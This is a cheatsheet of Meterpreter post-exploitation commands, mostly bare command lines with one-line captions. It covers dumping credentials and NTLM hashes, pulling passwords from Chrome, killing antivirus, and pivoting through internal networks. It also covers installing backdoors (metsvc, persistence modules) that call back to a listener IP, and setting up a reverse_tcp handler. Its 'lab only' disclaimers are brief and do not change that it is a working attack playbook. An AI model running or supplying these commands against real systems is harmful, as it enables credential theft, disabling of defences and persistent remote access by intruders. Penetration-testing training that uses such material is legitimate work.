# Meterpreter Post-Exploitation & Persistence Cheatsheet

## System & Environment Enumeration
- *Check if the target is running inside a virtual machine:*

      run post/windows/gather/checkvm


*Migrate Meterpreter into explorer.exe (safer stability in labs):*

    run migrate -n explorer.exe

*Enumerate Windows network shares (authorized testing only):*

    run post/windows/gather/enum_shares

## Credential & Password Gathering (Legal Environments Only)
*Collect system credential artifacts:*

    run post/windows/gather/credentials/credential_collector

*Attempt credential discovery from Chrome (if present):*

    run post/windows/gather/credentials/chrome


*Collect NTLM hashes in a lab environment:*

    run post/windows/gather/smart_hashdump

## Defensive Testing: AV, Services, & System Checks
*Test antivirus resilience by simulating AV termination attempts:*
> **Note:** Only for controlled red-team labs. Never run on real systems.

    run post/windows/manage/killav


*List all running Windows services:*

    run service_manager -l

*Attempt to interact with a specific service:*

    run service_manager -i -n wuauserv


## Network & Routing Enumeration (Pivot Testing in Labs)
*Scan the ARP table for active hosts in the subnet:*

    run arp_scanner -r 192.168.1.1/24

*Automatically configure internal routing (used for lab pivoting):*

    run post/multi/manage/autoroute



*Add a manual pivot route:*

    run autoroute -s 192.168.1.1/24 -p


## Backdoor & Persistence
These commands demonstrate how Meterpreter persistence and backdoor modules work inside a controlled testing environment.

### Backdoor: Metsvc (Legacy Meterpreter Service)
*Show Metsvc help:*

    run metsvc -h

*Install Metsvc backdoor automatically:*

    run metsvc -A


*Install manually:*

    run metsvc


### Backdoor: Persistence Module (Startup Persistence)
#### View persistence options

    run persistence -h


#### Create user-level persistence (runs every 10 seconds)

    run persistence -U -i 10 -p 4455 -r 192.168.1.6


#### Create advanced persistence
*With autostart + user-level + startup folder + custom location + custom port:*

    run exploit/windows/local/persistence -A -U -X -i 10 -l c:\data\ -r 192.168.1.7 -p 4466


## Listener Setup (Multi/Handler)
*Load the handler module:*

    use exploit/multi/handler


*Set the payload type:*

    set payload windows/meterpreter/reverse_tcp


*Set listener IP:*

    set LHOST 192.168.1.7


*Set listener port:*

    set LPORT 4466
    
*Start the listener:*

    exploit

